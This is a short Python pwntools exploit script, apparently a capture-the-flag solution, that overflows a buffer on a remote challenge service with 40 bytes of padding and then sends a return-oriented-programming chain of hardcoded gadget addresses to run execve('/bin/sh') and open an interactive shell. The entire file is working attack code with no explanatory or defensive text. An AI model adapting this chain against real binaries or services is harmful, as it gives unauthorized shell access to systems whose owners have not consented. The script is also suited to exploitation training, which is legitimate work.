#!/usr/bin/env python
from pwn import *

r = remote("csie.ctf.tw",10130)

context.arch = "amd64"

data = 0x6c9a20
pop_rsi_ret = 0x0000000000401577
pop_rdi_ret = 0x0000000000401456
pop_rax_rdx_rbx_ret = 0x0000000000478516
mov_rdi_rsi = 0x000000000047a502
pop_rsi_ret = 0x0000000000401577
syscall = 0x00000000004671b5

payload = "a"*40
payload += flat([pop_rsi_ret,"/bin/sh\x00",pop_rdi_ret,data,mov_rdi_rsi,pop_rax_rdx_rbx_ret,0x3b,0,0,pop_rsi_ret,0,syscall])
r.sendline(payload)
r.interactive()
